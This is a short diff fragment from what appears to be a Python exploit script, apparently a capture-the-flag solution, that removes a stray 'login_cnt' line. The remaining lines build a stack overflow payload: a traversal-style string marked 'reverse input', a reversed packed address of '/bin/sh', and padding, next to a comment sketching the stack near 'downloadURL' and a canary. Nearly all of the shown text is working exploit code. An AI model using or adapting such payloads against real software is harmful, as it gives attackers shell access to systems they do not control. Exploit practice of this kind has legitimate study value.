@@ -56,7 +56,6 @@ canary
 ============ <= stack of downloadURL
 '''
 
-login_cnt
 payload = "aa/../../cccccccc" # reverse input
 payload += p32(binsh)[::-1]
 payload += "AAAA"
